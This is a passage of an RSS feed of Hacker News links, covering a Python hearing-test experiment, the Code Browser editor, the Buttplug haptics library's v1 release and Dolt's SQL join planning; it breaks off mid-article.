<p><img src="https://0x90.psaux.io/2020/12/19/Experimenting-On-My-Hearing-Loss/hl-to-spl.png" title="HL to SPL"></p><p>The problem here is I don’t know the standard of my audiogram’s calibration and I don’t know which earphones they have tested me with. So, we need to gather our own data. Let’s do our own hearing test! But this time we won’t be using dB SPL, we’ll just measure the usual dB values from my computer. The result will be specific to my computer but that’s fine. At least it’s going to be reliable. </p>
<p>Let’s create sine waves at the frequencies 125 Hz, 250 Hz, 500 Hz, 1000 Hz, 2000 Hz, 4000 Hz, and 6000 Hz with decreasing volume. Then, I’ll listen to the audio files and mark the last points I can hear something. </p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br></pre></td><td><pre><span><span>import</span> numpy <span>as</span> np</span><br><span><span>from</span> scipy.io <span>import</span> wavfile</span><br><span></span><br><span><span>if</span> __name__ == <span>"__main__"</span>:</span><br><span>    sampleRate = <span>44100</span></span><br><span>    duration = <span>0.05</span></span><br><span></span><br><span>    sampleCount = sampleRate * duration</span><br><span></span><br><span>    <span>for</span> freq <span>in</span> [<span>125</span>, <span>250</span>, <span>500</span>, <span>1000</span>, <span>2000</span>, <span>4000</span>, <span>6000</span>]:</span><br><span>        samples = np.array([])</span><br><span>        amp = <span>0.01</span></span><br><span></span><br><span>        t = <span>0.0</span></span><br><span>        <span>while</span> <span>True</span>:</span><br><span>            ta = np.linspace(t, t+duration, sampleCount)</span><br><span></span><br><span>            startTime = np.round(t, <span>2</span>)</span><br><span>            endTime = np.round(t+<span>0.05</span>, <span>2</span>)</span><br><span></span><br><span>            dB = np.round(<span>20</span> * np.log10(amp), <span>2</span>)</span><br><span></span><br><span>            print(<span>f"<span>{startTime}</span>-<span>{endTime}</span>s: <span>{dB}</span> dB"</span>)</span><br><span></span><br><span>            namples = np.sin(<span>2</span> * np.pi * freq * ta)</span><br><span>            namples *= amp</span><br><span></span><br><span>            t += duration</span><br><span>            amp -= <span>0.0001</span></span><br><span></span><br><span>            samples = np.append(samples, namples)</span><br><span></span><br><span>            <span>if</span> amp &lt;= <span>0.0</span>:</span><br><span>                <span>break</span></span><br><span></span><br><span>        wavfile.write(<span>f"sine_<span>{freq}</span>.wav"</span>, sampleRate, samples)</span><br></pre></td></tr></tbody></table></figure>

<p>Ok, the results are in. Look at that cool audiogram I created at <a href="https://www.canva.com/" target="_blank" rel="noopener">canva.com</a>:</p>
<p><img src="https://0x90.psaux.io/2020/12/19/Experimenting-On-My-Hearing-Loss/betteraudiogram.png" title="My Audiogram"></p><p>Haha. Now let’s edit our code. We’ll remove the basedB variable and add our new audiogram to the code:</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br></pre></td><td><pre><span>audiogram = [ </span><br><span>    [<span>125.0</span>,  <span>-66.02</span>],</span><br><span>    [<span>250.0</span>,  <span>-66.02</span>],</span><br><span>    [<span>500.0</span>,  <span>-67.96</span>],</span><br><span>    [<span>1000.0</span>, <span>-60.0</span>],</span><br><span>    [<span>2000.0</span>, <span>-47.96</span>],</span><br><span>    [<span>4000.0</span>, <span>-44.88</span>],</span><br><span>    [<span>6000.0</span>, <span>-44.44</span>]</span><br><span>]</span><br></pre></td></tr></tbody></table></figure>

<p>We’ll slightly edit <code>getDominantFreq</code> to return dominant frequency’s dB:</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br></pre></td><td><pre><span></span><br><span><span><span>def</span> <span>amplitudeTodB</span><span>(amp)</span>:</span></span><br><span>    <span>return</span> <span>20</span> * np.log10(amp)</span><br><span></span><br><span></span><br><span></span><br><span><span><span>def</span> <span>getDominantFreq</span><span>(sampleRate, window)</span>:</span></span><br><span>    </span><br><span>    yf = np.fft.fft(window)</span><br><span>    yf = np.abs(<span>2</span>*yf/len(window))</span><br><span></span><br><span>    windowSize = len(window)</span><br><span></span><br><span>    maxAmp = <span>0.0</span></span><br><span>    maxAmpIdx = <span>0</span></span><br><span>    …</span></pre></td></tr></tbody></table></figure></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://0x90.psaux.io/2020/12/19/Experimenting-On-My-Hearing-Loss/">https://0x90.psaux.io/2020/12/19/Experimenting-On-My-Hearing-Loss/</a></em></p>]]>
            </description>
            <link>https://0x90.psaux.io/2020/12/19/Experimenting-On-My-Hearing-Loss/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25562273</guid>
            <pubDate>Mon, 28 Dec 2020 19:21:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Code Browser]]>
            </title>
            <description>
<![CDATA[
Score 89 | Comments 18 (<a href="https://news.ycombinator.com/item?id=25561688">thread link</a>) | @joubert
<br/>
December 28, 2020 | https://tibleiz.net/code-browser/ | <a href="https://web.archive.org/web/*/https://tibleiz.net/code-browser/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="page">





<div id="content">
<h2>About</h2>
<p><b>Code Browser</b> is a folding text editor for Linux and Windows, 
designed to hierarchically structure any kind of text file and especially source 
code. It makes navigation through source code faster and easier.

</p><center><img src="https://tibleiz.net/code-browser/images/code-browser.png"></center>

<p>Code Browser is especially designed to keep a good overview of the code of 
large projects, but is also useful for a simple CSS file. 
Ideal if you are fed up of having to scroll through thousands of lines of code.

</p><p>See the <a href="https://tibleiz.net/code-browser/code-folding.html">Introduction to Code Folding</a> page if you
want more information on text folding and the way it is implemented in Code Browser.

</p><p>It supports syntax highlighting for all major languages and custom syntax 
highlighting can also be added.

</p><p>Although Code Browser was initially designed to edit programs, it can 
also be used for different tasks such as plain text outlining or helping to understand
existing source code. I've added a page with suggestions to
<a href="https://tibleiz.net/code-browser/tips.html">take advantage of folding</a>.

<!--[c]-->
</p><h2>License</h2>
<p>Code Browser is released under the GPL v2 License.

</p></div>



</div></div>]]>
            </description>
            <link>https://tibleiz.net/code-browser/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25561688</guid>
            <pubDate>Mon, 28 Dec 2020 18:29:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Buttplug (Sex Toy Control Library) Hits v1 Milestone]]>
            </title>
            <description>
<![CDATA[
Score 311 | Comments 125 (<a href="https://news.ycombinator.com/item?id=25561392">thread link</a>) | @qdot76367
<br/>
December 28, 2020 | https://nonpolynomial.com/2020/12/28/buttplug-hits-v1-milestone/ | <a href="https://web.archive.org/web/*/https://nonpolynomial.com/2020/12/28/buttplug-hits-v1-milestone/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

		
<p>After 3.5 years of development, <a href="https://buttplug.io/">Buttplug</a>, the open source intimate haptics controls library created and maintained by Nonpolynomial, has finally arrived at its v1 release. Fitting that it’s also the first real blog post on the new <a href="https://nonpolynomial.com/blog">Nonpolynomial Blog</a>!</p>



<figure><img loading="lazy" width="640" height="640" src="https://nonpolynomial.com/wp-content/uploads/2020/12/buttplug_rust_docs.png" alt="" srcset="https://nonpolynomial.com/wp-content/uploads/2020/12/buttplug_rust_docs.png 640w, https://nonpolynomial.com/wp-content/uploads/2020/12/buttplug_rust_docs-300x300.png 300w, https://nonpolynomial.com/wp-content/uploads/2020/12/buttplug_rust_docs-150x150.png 150w, https://nonpolynomial.com/wp-content/uploads/2020/12/buttplug_rust_docs-100x100.png 100w, https://nonpolynomial.com/wp-content/uploads/2020/12/buttplug_rust_docs-480x480.png 480w" sizes="(max-width: 640px) 100vw, 640px"></figure>



<p>For the project, this is actually a contraction rather than an expansion. Version 1 means that the project has slimmed down to a <a href="https://github.com/buttplugio/buttplug-rs">core Rust implementation</a> upon which the ecosystem can continue to grow.</p>



<p>Buttplug v1.0.0 is available in the following flavors:</p>



<ul><li>Rust – <a href="https://crates.io/crates/buttplug">Crates.io</a>, <a href="https://github.com/buttplugio/buttplug-rs">Github</a></li><li>C# – <a href="https://www.nuget.org/packages/Buttplug">Nuget</a>, <a href="https://github.com/buttplugio/buttplug-rs-ffi">Github</a></li><li>JS/Typescript (via WASM, Web-only currently) – <a href="https://www.npmjs.com/package/buttplug">NPM</a>, <a href="https://github.com/buttplugio/buttplug-rs-ffi">Github</a></li></ul>



<p>The <a href="https://buttplug-developer-guide.docs.buttplug.io/">Buttplug Developer Guide</a> covers basic usage, with examples in all of the aforementioned languages.</p>



<h2>What Even Is Buttplug?</h2>



<p><a href="https://buttplug.io/">Buttplug</a> is a haptics abstraction library for intimate hardware. </p>



<p>Which is a fancy way of saying “a way of telling a bunch of different vibrators how to vibrate”. Though it can tell hardware how to do things other than vibrate, and it supports more form factors than buttplugs.</p>



<p>Basically, there are <a href="https://iostindex.com/">hundreds of computer controlled sex toys out there</a>. Most of them have unique protocols to control them. Buttplug tries to centralize these control protocols, handles cross platform USB/Bluetooth/serial/etc for the developer, and presents a uniform way of controlling the whatever toy the user may have. Instead of knowing what operating system the user is on and how to talk to their specific toy, developers can use Buttplug to enumerate for a supported device, then send generic commands like “vibrate/rotate at [speed]”. That’s it.</p>



<p>While the sex toy control part of Buttplug is probably the most recognizable and memorable feature, it’s not the only goal of the project. Buttplug was established as an experiment for creating user-focused haptics and interface device abstraction. Libraries and engines like <a href="https://www.chai3d.org/">Chai3D</a> and <a href="https://h3dapi.org/">H3D</a> work as generalized haptics engines for studying mechanical systems, texture and force creation/simulation, while other systems like <a href="https://vrpn.github.io/">VRPN</a> work as a sort of user-space HID manager for systems that may not conform to general HID protocol boundaries. Buttplug seeks to take these two paradigms, and smoosh them together while also servicing a niche that doesn’t get much engineering attention. This leads to many interesting questions, like:</p>



<ul><li>How do we quickly and reliably bring up hardware communication across multiple platforms?</li><li>How do we interact with a user whose affective state may differ from someone using “normal” software like a word processor or database?</li><li>How do we create a language expressive enough to generate the experience a user wants, while also abstract enough to not be device specific?</li><li>What are the <a href="https://buttplug-developer-guide.docs.buttplug.io/intro/buttplug-ethics.html">ethical implications of building open source technology for intimacy</a>?</li><li>Can these questions be approached through technology in a way that is maintainable by a small, possibly one person team?</li></ul>



<p>We’ve heard from our community that some users are just interested in controlling sex toys, though, and that’s fine too. I guess.</p>



<p>If you’re curious about what users are doing with Buttplug, <a href="https://github.com/buttplugio/awesome-buttplug">check out our awesome-buttplug project list repo</a>.</p>



<h2>A Short-ish History of Buttplug</h2>



<p>Here’s an overview of the 16 year path from my start in sex tech to a v1 library for the field.</p>



<ul><li>2004<ul><li><a href="https://kyle.machul.is/">Kyle</a> starts <a href="https://metafetish.com/">Slashdong (which became Metafetish, now defunct)</a> to write about sex tech engineering.</li></ul></li><li>2007<ul><li><a href="https://youtu.be/FRLygav4tcs">Kyle gives a presentation at Arse Elektronika mentioning “Obfuscated Macros”</a>, which at the time seemed like a great name because Kyle was a 20-something engineer. This idea would grow to become the basis of Buttplug.</li></ul></li><li>2013<ul><li><a href="https://github.com/buttplugio/buttplug-py-deprecated">First Python implementation, known as “Fuck Everything”.</a> Uses ZeroMQ and Python 2. Never full shipped due to issues with python application redistribution, as well as lack of hardware on the market to support.</li></ul></li><li>Fall 2016<ul><li><a href="https://github.com/buttplugio/buttplug-rs">First Rust implementation.</a> Stalls due to lack of platform support for Bluetooth (most hardware we interact with is Bluetooth LE) and other hardware.</li></ul></li><li>April 2017<ul><li><a href="https://github.com/buttplugio/buttplug-csharp">First C# implementation, using the recently released UWP BTLE APIs for Windows.</a> Library gains momentum and project takes off, also establishing a <a href="https://buttplug-protocol-spec.docs.buttplug.io/">protocol spec</a> to ensure compatibility between versions.</li></ul></li><li>May 2017<ul><li><a href="https://github.com/buttplugio/buttplug-js">First JS implementation</a>, using WebBluetooth to access BTLE through the Chrome web browser. Later included native Node implementation using <a href="https://github.com/noble/noble">noble</a> and other hardware libraries.</li></ul></li><li>August 2017<ul><li>Kyle incorporates <a href="https://nonpolynomial.com/">Nonpolynomial</a></li></ul></li><li>December 2017<ul><li>Generic messages added to the Buttplug Protocol Spec, making it easier to command a wide range of devices. Due to maintenance timing and life in general, this is the last change to protocol spec for the next 3 years.</li></ul></li><li>April 2019<ul><li><a href="https://github.com/buttplugio/buttplug-py">Python implementation of Client API for Buttplug.</a> All hardware access was still managed via either JS or C# implementations.</li></ul></li><li>May 2019<ul><li>Established the <a href="https://intiface.com/">Intiface brand</a> for Buttplug applications developed by <a href="https://nonpolynomial.com/">Nonpolynomial</a>.</li></ul></li><li>Sept 2019<ul><li>Realize that maintaining 2 full implementations of Buttplug was untenable for a 1 person development team, work started on a new core implementation of Buttplug in (at that point unstable) async Rust, with other language implementations would then live on top of.</li></ul></li><li>January 2020<ul><li>Forked <a href="https://github.com/mwylde/rumble">Rumble</a> into <a href="https://github.com/deviceplug/btleplug">btleplug</a> (begrudgingly changing the name because rumble would’ve been GREAT to have in Buttplug but the original author was AWOL so package couldn’t be transfers on crates.io), brought up minimum BTLE capabilities in Windows, macOS, and Linux.</li></ul></li><li>October 2020<ul><li>Core async Rust Buttplug implementation hits feature parity with the C# and JS libraries. <a href="https://github.com/buttplugio/buttplug-rs-ffi">Move to porting C#/JS to using Rust via FFI</a>. C# calls into the native Rust library using exported C calls, while JS uses a WASM layer.</li></ul></li><li>December 2020<ul><li>v1 release, along with the first shipping of a new spec version since December 2017. FFI C#/JS libraries at parity with original native C#/JS libraries, original native libraries deprecated and archived. <a href="https://buttplug-developer-guide.docs.buttplug.io/">Buttplug Developer Guide</a> in good enough shape to guide users on building simple Buttplug Applications. <a href="https://metafetish.com/">Metafetish</a> closes after 16 years in order to make way for new <a href="https://nonpolynomial.com/blog">Nonpolynomial blog</a>.</li></ul></li></ul>



<h2>What Buttplug Version 1 Means</h2>



<p>To me, a lot. To you, possibly not so much.</p>



<p>As mentioned, Buttplug Version 1 doesn’t really come with a lot of new features. It’s mostly a point where I can cut old stuff and start looking toward the future.</p>



<p><a href="https://github.com/buttplugio/buttplug-csharp">Buttplug C#</a> and <a href="https://github.com/buttplugio/buttplug-js">Buttplug JS</a> will now be archived, as implementations now live in our <a href="https://github.com/buttplugio/buttplug-rs-ffi">FFI repo</a>, and their respective <a href="https://www.nuget.org/packages/Buttplug/">nuget</a> and <a href="https://www.npmjs.com/package/buttplug">npm</a> packages will still live on as v1 and beyond. There will definitely be breaking changes between the v0.x and v1 versions for C#/JS, so if you’ve been developing on those, be ready. I did my best to keep the APIs similar, but also used this as a way to clean up some problems that had cropped up along the way.</p>



<p>Before v1, adding new features or hardware protocols meant implementing things in at least 2 places. Now, features can be implemented in Rust, then all that is required is a rebuild of the FFI and package version numbers being rolled. At worse, the FFI API surface may require changes, but that’s fairly trivial work versus having to redo full feature implementations. Most of the FFI work is up front in the initial implementation, and the hope is that continued maintenance will be much simpler. Time will tell whether this was a total mistake.</p>



<p>Success will be measured via this possible reduction of rote coding work. I’d like to spend more time on design with a flexible system versus having to re-implement my ideas multiple times to test them out across all platforms.</p>



<p>The Version 1 release will also probably be the only time that multiple libraries are released in lockstep with the same version number. I suspect that the FFI libraries will have API surface level issues that will require major version rolls outside of when the rust library updates. Everyone who has an affinity for version numbers, enjoy these stars aligning now, because it’s probably the last time it’ll happen.</p>



<h2>What’s Next</h2>



<p>There’s so many directions to go now that it’s almost hard to pick which to start with, but here’s some general ideas of what I’d like to do next:</p>



<ul><li>Blog Posts<ul><li>I have this shiny new blog now and I’d like to use it more. I have a lot of thoughts about Rust, WASM, and other technologies I’m using that I’d like to cover here.</li></ul></li><li>Documentation<ul><li>Buttplug v1 is documented just enough to maybe get people started, but the <a href="https://buttplug-developer-guide.docs.buttplug.io/">developer guide</a> and API documentation for the various implementations definitely need more love.</li></ul></li><li>More FFI Implementations<ul><li>Python is on the way soon, and C/C++ (especially for Unreal Engine suppot) and Java/Kotlin have been requested by the community.</li></ul></li><li>Application Updates<ul><li>I maintain a few applications, like <a href="https://intiface.com/desktop">Intiface Desktop</a> and the <a href="https://intiface.com/ghr">Game Haptics Router</a>, that have been backburnered while v1 was in progress. Would really like to get those updated and add some new features. Also need to update dependent libraries, like our <a href="https://github.com/buttplugio/buttplug-unity">Unity Game Engine</a> and <a href="https://github.com/buttplugio/buttplug-twine">Twine Game Engine</a> support.</li></ul></li><li>Hardware Support<ul><li>The v1 slog (this was supposed to be done in October, then <a href="https://www.supergiantgames.com/games/hades/">Hades</a> happened. Oops.) means hardware support for things like the <a href="https://patreon.com/tempestvr">OSR2</a> and <a href="https://github.com/buttplugio/buttplug-rs/issues/151">Nintendo Joycon</a> are still in development and running behind.</li></ul></li><li>Actually Making New Stuff<ul><li>Everything listed so far is continued maintenance. It’d be nice to actually make some new things too. Don’t know what those will be, but I need to actually create with my creation, instead of just creating my creation.</li></ul></li></ul>



<h2>Thanks</h2>



<p>Thanks go to:</p>



<ul><li>Loved ones and friends who’ve had to put up with me being “The Buttplug Guy” for the past 16 years (with no sign of that ending soon).</li><li>My <a href="https://patreon.com/qdot">Patreon</a> and <a href="https://github.com/sponsors/qdot">Github Sponsors</a> Subscribers, who’ve kept the project funded enough for me to buy new hardware.</li><li>My consulting clients for <a href="https://nonpolynomial.com/">Nonpolynomial</a>, who’ve helped keep the business cash positive while also helping my project along with support in their products.</li><li>Everyone who worked on reverse engineering toys and donating info to our <a href="https://stpihkal.docs.buttplug.io/">Sex Toys Protocols I Have Known And Loved (STPIHKAL) </a>documentation project.</li><li>Sex tech projects like <a href="https://iostindex.com/">IOSTI…</a></li></ul></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://nonpolynomial.com/2020/12/28/buttplug-hits-v1-milestone/">https://nonpolynomial.com/2020/12/28/buttplug-hits-v1-milestone/</a></em></p>]]>
            </description>
            <link>https://nonpolynomial.com/2020/12/28/buttplug-hits-v1-milestone/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25561392</guid>
            <pubDate>Mon, 28 Dec 2020 18:01:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Implementing join planning in our open source Golang SQL query engine]]>
            </title>
            <description>
<![CDATA[
Score 99 | Comments 15 (<a href="https://news.ycombinator.com/item?id=25561173">thread link</a>) | @zachmu
<br/>
December 28, 2020 | https://www.dolthub.com/blog/2020-12-28-join-planning/ | <a href="https://web.archive.org/web/*/https://www.dolthub.com/blog/2020-12-28-join-planning/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-cy="blog-post-text">
<p><a href="https://github.com/dolthub/dolt/">Dolt</a> is Git for Data. It's a SQL
database that you can clone, fork, branch, and merge. Dolt's SQL
engine is
<a href="https://github.com/dolthub/go-mysql-server/">go-mysql-server</a>, and
today we're going to discuss how it implements join planning to make a
query plan involving multiple tables as efficient as possible.</p>

<p>When a query involves more than one table, there are many different
ways to access those tables to get a correct result. But some ways are
much faster than others! Choosing an order to access tables in and a
strategy to assemble result rows is known as join planning. This is
easiest to explain with an example.</p>
<p>Let's create three tables to track the populations of cities and
states, and the people who live in them. If you have Dolt installed
(link in the sidebar), you can follow along.</p>
<div data-language="sql"><pre><code><span>%</span> mkdir <span>join</span><span>-</span>planning <span>&amp;&amp;</span> cd <span>join</span><span>-</span>planning
<span>%</span> dolt init
Successfully initialized dolt <span>data</span> repository<span>.</span>
<span>%</span> dolt <span>sql</span>



join_planning<span>&gt;</span> <span>create</span> <span>table</span> states <span>(</span>name <span>varchar</span><span>(</span><span>100</span><span>)</span> <span>primary</span> <span>key</span> <span>not</span> <span>null</span><span>,</span> population <span>int</span> <span>unsigned</span><span>)</span><span>;</span>
join_planning<span>&gt;</span> <span>create</span> <span>table</span> cities <span>(</span>name <span>varchar</span><span>(</span><span>100</span><span>)</span> <span>primary</span> <span>key</span> <span>not</span> <span>null</span><span>,</span> state <span>varchar</span><span>(</span><span>100</span><span>)</span> <span>not</span> <span>null</span><span>,</span> population <span>int</span> <span>unsigned</span><span>)</span><span>;</span>
join_planning<span>&gt;</span> <span>create</span> <span>table</span> people <span>(</span>name <span>varchar</span><span>(</span><span>100</span><span>)</span> <span>primary</span> <span>key</span> <span>not</span> <span>null</span><span>,</span> city <span>varchar</span><span>(</span><span>100</span><span>)</span> <span>not</span> <span>null</span><span>)</span><span>;</span></code></pre></div>
<p>Let's say that we want a list of people named "John Smith" along with
names and populations of the cities and states they live in. We would
write a query like this:</p>
<div data-language="sql"><pre><code><span>select</span> <span>*</span> <span>from</span> people p 
    <span>join</span> cities c <span>on</span> p<span>.</span>city <span>=</span> c<span>.</span>name 
    <span>join</span> states s <span>on</span> s<span>.</span>name <span>=</span> c<span>.</span>state 
    <span>where</span> p<span>.</span>name <span>=</span> <span>"John Smith"</span><span>;</span></code></pre></div>
<p>There's lots of ways that a query planner could execute this query. A
really bad way would be to look at every combination of every row from
all three tables and test each combination to see if it matches the
<code>JOIN</code> condition and <code>WHERE</code> clause. This is correct and valid, but
very expensive. If we say that the <code>states</code>, <code>cities</code> and <code>people</code>
tables contain <code>S</code>, <code>C</code> and <code>P</code> rows respectively, this query plan
(which is called a cross join), will result in <code>S * C * P</code> row
accesses and comparisons. It's a bad idea. </p>
<p>There are simple tricks you can use to speed up query execution. Using
<a href="https://www.dolthub.com/blog/2020-10-28-pushdown-filters/">pushdown
optimization</a>,
you can eliminate most of the accesses to the <code>people</code> table. Let's
say that the number of "John Smiths" in the database is called <code>J</code>,
and it's much smaller than <code>P</code>. Then using pushdown intelligently
reduces the cost of our access to <code>S * C * J</code>.</p>
<p>Until a few weeks ago, this was as good as
<a href="https://github.com/dolthub/dolt/">Dolt</a> could do on joins of three or
more tables. For two tables, we would use an index if available. But
for three, no luck. It made the product borderline unusable for a
workload with this query pattern and a non-trivial data size.</p>
<p>This blog post is about how we optimized the join planner to generate
more intelligent, efficient query plans for any number of tables. In
today's version of <a href="https://github.com/dolthub/dolt/">Dolt</a>, that same
query will generate the following query plan:</p>
<div data-language="sql"><pre><code>join_planning<span>&gt;</span> <span>explain</span> <span>select</span> <span>*</span> <span>from</span> people p 
    <span>join</span> cities c <span>on</span> p<span>.</span>city <span>=</span> c<span>.</span>name 
    <span>join</span> states s <span>on</span> s<span>.</span>name <span>=</span> c<span>.</span>state 
    <span>where</span> p<span>.</span>name <span>=</span> <span>"John Smith"</span><span>;</span>
<span>+</span>
<span>|</span> <span>plan</span>                                                        <span>|</span>
<span>+</span>
<span>|</span> IndexedJoin<span>(</span>p<span>.</span>city <span>=</span> c<span>.</span>name<span>)</span>                                <span>|</span>
<span>|</span>  ├─ Filter<span>(</span>p<span>.</span>name <span>=</span> <span>"John Smith"</span><span>)</span>                           <span>|</span>
<span>|</span>  │   └─ Projected <span>table</span> access <span>on</span> <span>[</span>name city<span>]</span>               <span>|</span>
<span>|</span>  │       └─ TableAlias<span>(</span>p<span>)</span>                                   <span>|</span>
<span>|</span>  │           └─ Indexed <span>table</span> access <span>on</span> <span>index</span> <span>[</span>people<span>.</span>name<span>]</span> <span>|</span>
<span>|</span>  │               └─ Exchange<span>(</span>parallelism<span>=</span><span>16</span><span>)</span>                <span>|</span>
<span>|</span>  │                   └─ <span>Table</span><span>(</span>people<span>)</span>                       <span>|</span>
<span>|</span>  └─ IndexedJoin<span>(</span>s<span>.</span>name <span>=</span> c<span>.</span>state<span>)</span>                           <span>|</span>
<span>|</span>      ├─ TableAlias<span>(</span>c<span>)</span>                                       <span>|</span>
<span>|</span>      │   └─ IndexedTableAccess<span>(</span>cities <span>on</span> <span>[</span>cities<span>.</span>name<span>]</span><span>)</span>     <span>|</span>
<span>|</span>      └─ TableAlias<span>(</span>s<span>)</span>                                       <span>|</span>
<span>|</span>          └─ IndexedTableAccess<span>(</span>states <span>on</span> <span>[</span>states<span>.</span>name<span>]</span><span>)</span>     <span>|</span>
<span>+</span></code></pre></div>
<p>The plan starts with an indexed access on the <code>name</code> column of
<code>people</code> to find all the John Smiths. Then for each row, it uses a
primary key index to look up the city. Then for each city, it uses
another primary key to look up the state. In all, this leads to a
total query cost of <code>J * 3</code>. </p>
<h2>Is that... a lot?</h2>
<p><img src="https://www.dolthub.com/blog/1e2adb7b32ddb47442f1c254bf2358ed/is-that-a-lot.gif" alt="Is that a lot?"></p>
<p>Using some real numbers to drive this home: let's use the US and say
that there are 330,000,000 <code>people</code> rows, 20,000 <code>cities</code> rows, and 52
<code>states</code> rows (we didn't forget you, DC and Puerto Rico). A cross join
query plan would access a number of rows equal to the product of these
numbers, which is roughly 343 trillion accesses. It's a big
number. Your query isn't going to complete.</p>
<p><a href="http://howmanyofme.com/#:~:text=The%20U.S.%20Census%20Bureau%20statistics,Smith%20in%20the%20United%20States.">There are about 48,000 people named John
Smith</a>
in the US. So using pushdown optimization gets us down to about 50
billion row accesses. This is a lot better than before, but still
terrible. The query isn't returning.</p>
<p>Using both pushdown to the <code>people</code> table and indexed accesses to
<code>cities</code> and <code>states</code>, on the other hand, limits the query execution
to only 48,000 accesses to the <code>people</code> table, then 1 access to each of
the <code>cities</code> and <code>states</code> table for each of these rows. That's <code>3 *
48,000</code>, or 144,000 table accesses total.</p>
<table>
<thead>
<tr>
<th>Join plan</th>
<th>Number of rows accessed</th>
</tr>
</thead>
<tbody>
<tr>
<td>Cross join</td>
<td>343 * 10^12</td>
</tr>
<tr>
<td>Cross join with pushdown</td>
<td>50 * 10^9</td>
</tr>
<tr>
<td>Pushdown and indexed access</td>
<td>144 * 10^3</td>
</tr>
</tbody>
</table>
<p>Unlike in the <a href="https://www.dolthub.com/blog/2020-10-28-pushdown-filters/">pushdown
blog</a>, I
won't bother to spell out the percentage savings. We're looking at 4
decimal orders of magnitude improvement for the first optimization,
then another 5 for the second. It's the difference between
<a href="https://github.com/dolthub/dolt/">Dolt</a> being a usable query engine
or a bad space heater.</p>

<p>To assemble an efficient query plan, you have to start by by answering
one really important question:</p>
<blockquote>
<p>What order should we access the tables in?</p>
</blockquote>
<p>This really makes all the difference. In the example above, a table
access order of <code>people &gt; cities &gt; states</code> lets us use the primary key
index on the latter two tables. If we instead chose the order <code>states &gt; cities &gt; people</code>,
we can't use the information from earlier tables
to reduce the number of lookups into later tables, giving us a cross join.</p>
<p>There are a lot of interesting details to get wrong, but to get table
order right you can use some pretty simple heuristics.</p>
<ol>
<li><strong>What index could I use</strong> to access this table? Are those columns part
of a join condition?</li>
<li><strong>Are required columns available to use as a key</strong>? Did the other tables
in the join condition precede this one?</li>
<li><strong>How many rows are in this table</strong> if I need to do a full table scan?</li>
<li><strong>Is this a <code>LEFT</code> or <code>RIGHT</code> join</strong>, and if so, is this table on the
side of the join that requires it to come first?</li>
</ol>
<p>We'll come back to the actual implementation of the table ordering
algorithm later. For now let's assume its existence, and it tells us
which order to access tables in. How do we build a join plan with that
access order?</p>

<p>In <a href="https://github.com/dolthub/go-mysql-server/">go-mysql-server</a>,
query plans are organized in a tree of <code>Node</code> objects. As of now, all
nodes have at most two children, making the query plan a binary-ish
tree. A <code>Join</code> node knows how to get a row from its left child, then
iterate over its right child looking for matches on the join
condition. When the right child iterator is out of rows, it gets the
next row from its left child. Eventually it runs out of rows in the
left child and returns <code>io.EOF</code> from its iterator.</p>
<p>Like everything else, this is easiest to visualize with some
examples. For all of these, we'll use one-letter table names with
single columns that match the table name. Here's a simple join between
two tables A and B:</p>
<div data-language="sql"><pre><code><span>select</span> <span>*</span> <span>from</span> A <span>join</span> B <span>on</span> a <span>=</span> b<span>;</span></code></pre></div>
<p>A naive query plan looks like this:</p>
<p><span>
      <a href="https://www.dolthub.com/blog/static/f152b6bd7fc9b89b96bcd7f8d89c10f7/efc6e/simple-join.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="two table join" title="two table join" src="https://www.dolthub.com/blog/static/f152b6bd7fc9b89b96bcd7f8d89c10f7/efc6e/simple-join.png" srcset="https://www.dolthub.com/blog/static/f152b6bd7fc9b89b96bcd7f8d89c10f7/a48b3/simple-join.png 214w,
https://www.dolthub.com/blog/static/f152b6bd7fc9b89b96bcd7f8d89c10f7/47730/simple-join.png 428w,
https://www.dolthub.com/blog/static/f152b6bd7fc9b89b96bcd7f8d89c10f7/efc6e/simple-join.png 441w" sizes="(max-width: 441px) 100vw, 441px" loading="lazy">
  </a>
    </span></p>
<p>As we add additional tables to the join, they become the new root of
the tree, with the original subtree as the left child.</p>
<div data-language="sql"><pre><code><span>select</span> <span>*</span> <span>from</span> A <span>join</span> B <span>on</span> a <span>=</span> b <span>join</span> C <span>on</span> b <span>=</span> c<span>;</span></code></pre></div>
<p><span>
      <a href="https://www.dolthub.com/blog/static/86dc27f0812c85e41a1fe0cbb4415be2/508ef/three-table-join.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="three table join" title="three table join" src="https://www.dolthub.com/blog/static/86dc27f0812c85e41a1fe0cbb4415be2/508ef/three-table-join.png" srcset="https://www.dolthub.com/blog/static/86dc27f0812c85e41a1fe0cbb4415be2/a48b3/three-table-join.png 214w,
